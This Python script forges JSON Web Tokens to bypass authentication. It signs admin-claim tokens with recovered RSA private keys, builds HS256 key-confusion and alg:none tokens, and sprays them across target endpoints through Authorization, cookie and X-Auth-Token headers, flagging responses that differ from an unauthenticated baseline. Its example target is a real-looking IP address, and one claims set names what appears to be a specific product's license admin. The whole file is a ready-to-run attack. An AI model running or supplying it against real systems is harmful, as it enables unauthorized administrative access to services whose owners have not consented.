#!/usr/bin/env python3
"""
JWT forgery attack: test all recovered private keys against discovered endpoints.

Algorithms tried per token:
  RS256, RS384, RS512  (signed with recovered private key)
  HS256 with public key as HMAC secret  (CVE-2017-1000412 family confusion)
  alg:none                              (CVE-2015-2951)

Header carriers tried:
  Authorization: Bearer
  Cookie: token=, jwt=, auth=
  X-Auth-Token

Each request is compared against a no-auth baseline; only responses that
materially differ (status OR size delta > 50 B) are flagged.
"""
from __future__ import annotations
import argparse, base64, hashlib, hmac, json, sys, time
from pathlib import Path

import httpx
import jwt as pyjwt
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def craft_alg_none(claims: dict) -> str:
    header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    body = b64url(json.dumps(claims).encode())
    return f"{header}.{body}."


def craft_rs(priv_pem: bytes, claims: dict, alg: str) -> str:
    return pyjwt.encode(claims, priv_pem, algorithm=alg)


def craft_hs256_with_pubkey(pub_pem: bytes, claims: dict) -> str:
    header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    body = b64url(json.dumps(claims).encode())
    signing = f"{header}.{body}".encode()
    sig = hmac.new(pub_pem, signing, hashlib.sha256).digest()
    return f"{header}.{body}.{b64url(sig)}"


def extract_pubkey(priv_pem_bytes: bytes) -> bytes:
    pk = serialization.load_pem_private_key(
        priv_pem_bytes, password=None, backend=default_backend()
    )
    return pk.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )


CLAIMS_VARIANTS = [
    {"sub": "admin", "user": "admin", "role": "admin", "username": "admin",
     "is_admin": True, "iat": int(time.time()), "exp": int(time.time()) + 7200},
    {"sub": "1", "uid": 1, "role": "administrator", "admin": True,
     "iat": int(time.time())},
    {"username": "diskover", "scope": "admin", "iss": "diskover-license-admin"},
]


def main():
    p = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-t", "--target", required=True,
                   help="Base URL, e.g. https://54.185.155.123")
    p.add_argument("-k", "--key", action="append", required=True,
                   help="Path to recovered RSA private key (PEM, repeatable)")
    p.add_argument("-e", "--endpoint", action="append", required=True,
                   help="Endpoint path to probe (repeatable)")
    p.add_argument("--insecure", action="store_true",
                   help="Skip TLS verification")
    args = p.parse_args()

    forged: list[tuple[str, str]] = []
    for key_path in args.key:
        priv = Path(key_path).read_bytes()
        pub_pem = extract_pubkey(priv)
        name = Path(key_path).stem
        for claims in CLAIMS_VARIANTS:
            for alg in ("RS256", "RS384", "RS512"):
                try:
                    forged.append((f"{name}-{alg}", craft_rs(priv, claims, alg)))
                except Exception as e:
                    print(f"[!] {alg} sign failed: {e}", file=sys.stderr)
            try:
                forged.append((f"{name}-HS-confusion",
                               craft_hs256_with_pubkey(pub_pem, claims)))
            except Exception as e:
                print(f"[!] HS-confusion failed: {e}", file=sys.stderr)
    for claims in CLAIMS_VARIANTS:
        forged.append(("alg-none", craft_alg_none(claims)))

    print(f"[*] {len(forged)} tokens × {len(args.endpoint)} endpoints × 5 headers")

    hits = []
    with httpx.Client(verify=not args.insecure, timeout=8.0,
                       follow_redirects=False) as c:
        for ep in args.endpoint:
            url = args.target.rstrip("/") + ep
            base = c.get(url)
            bs, bl = base.status_code, len(base.content)
            for label, tok in forged:
                for hdr_name, hdr_value in [
                    ("Authorization", f"Bearer {tok}"),
                    ("Cookie", f"token={tok}"),
                    ("Cookie", f"jwt={tok}"),
                    ("Cookie", f"auth={tok}"),
                    ("X-Auth-Token", tok),
                ]:
                    try:
                        r = c.get(url, headers={hdr_name: hdr_value})
                    except Exception:
                        continue
                    size_changed = abs(len(r.content) - bl) > 50
                    status_changed = r.status_code != bs
                    if r.status_code in (200, 201, 202, 204) and (
                        status_changed or size_changed
                    ):
                        hit = {
                            "endpoint": ep, "label": label, "header": hdr_name,
                            "base": f"{bs}/{bl}",
                            "got": f"{r.status_code}/{len(r.content)}",
                            "snippet": r.text[:200].replace("\n", " "),
                        }
                        hits.append(hit)
                        print(f"[+] HIT  {ep}  {label}  via {hdr_name}  "
                              f"baseline={bs}/{bl}  got={r.status_code}/{len(r.content)}")
    print(f"\n=== {len(hits)} hits ===")
    print(json.dumps(hits, indent=2))


if __name__ == "__main__":
    main()
